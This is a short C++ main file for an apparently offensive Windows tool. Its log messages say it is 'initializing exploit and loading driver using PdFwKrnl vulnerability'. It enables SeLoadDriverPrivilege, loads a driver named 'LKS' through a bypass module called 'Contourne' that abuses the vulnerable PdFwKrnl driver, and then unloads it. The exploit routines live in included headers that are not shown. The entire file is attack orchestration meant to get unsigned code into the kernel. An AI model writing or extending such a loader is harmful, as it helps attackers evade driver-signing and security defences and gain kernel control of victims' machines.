#include <iostream>
#include <windows.h>

#include "Load.h"
#include "Contourne.h"
#include "driver_data.h"

int main()
{
    std::cout <<  (" Initializing ...\n");


    if (!Contourne::init())
    {
        std::cerr <<  (" [ERROR] Initialization failed. Exiting.\n");
        return 1;
    }
    std::cout <<  (" Initializing exploit and loading driver using PdFwKrnl vulnerability...\n");

    if (!driver::util::enable_privilege(("SeLoadDriverPrivilege")))
    {
        std::cerr << ("[ERROR] Failed to enable 'SeLoadDriverPrivilege'.") << std::endl;
        return 1;
    }

    Contourne::Status status = Contourne::load_driver("LKS", "PdFwKrnl");
    std::cout <<  (" --> Status : ") << Contourne::status_to_string(status) << std::endl;

    if (driver::unload("LKS"))
    {
        std::cout <<  (" [INFO] Driver Unloaded !\n");
    }
    else
    {
        std::cerr <<  (" [ERROR] Failed to unload driver !\n");
    }

    Sleep(5000);

    return 0;
}